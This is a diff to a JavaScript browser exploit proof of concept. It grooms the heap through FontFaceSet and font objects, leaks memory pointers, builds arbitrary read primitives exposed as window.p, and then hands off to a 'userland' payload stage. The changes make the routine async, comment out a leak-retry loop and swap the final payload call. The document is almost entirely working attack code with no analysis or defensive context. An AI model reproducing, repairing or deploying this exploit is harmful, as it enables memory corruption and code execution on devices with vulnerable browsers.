@@ -9,7 +9,7 @@ var INVALID_POINTER = 0;
 var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
 var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time
 
-function poc() {
+async function poc() {
 
     function hex(n) {
         if ((typeof n) != "number")
@@ -135,8 +135,8 @@ function poc() {
         mkString(HASHMAP_BUCKET, p_s);
 
 // var needfix = [];
-for(var i = 0;; i++)
-{
+// for(var i = 0;; i++)
+// {
     var ffs2 = ffses["ffs_leak_"+i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font+1], good_font]);
     var badstr2 = mkString(HASHMAP_BUCKET, p_s);
     mkString(HASHMAP_BUCKET, p_s);
@@ -146,9 +146,9 @@ for(var i = 0;; i++)
     bad_fonts[guessed_font + 1].family = "evil3";
 
     var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
-    if(leak < 0x1000000000000)
-        break;
-}
+//     if(leak < 0x1000000000000)
+//         break;
+// }
     // var ffses = {};
 
     function makeReader(read_addr, ffs_name) {
@@ -264,12 +264,12 @@ for(var i = 0;; i++)
         ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));
 
     for (var i = 0; i < HAMMER_NSTRINGS; i++)
-        mkString(HASHMAP_BUCKET, pp_s);
+         mkString(HASHMAP_BUCKET, pp_s);
 
 var ffs7 = ffses.ffs7 = new FontFaceSet(ffs7_args);
-    mkString(HASHMAP_BUCKET, pp_s);
+     mkString(HASHMAP_BUCKET, pp_s);
 var ffs8 = ffses.ffs8 = new FontFaceSet(ffs8_args);
-var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
+var post_ffs =  mkString(HASHMAP_BUCKET, fake_s);
 // needfix.push(post_ffs);
 
     for (var i = 0; i < 13; i++)
@@ -383,7 +383,7 @@ var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
         }
     };
     window.p = prim;
-    run_hax();
+    await userland();
     // window.location.href='.';
 
 
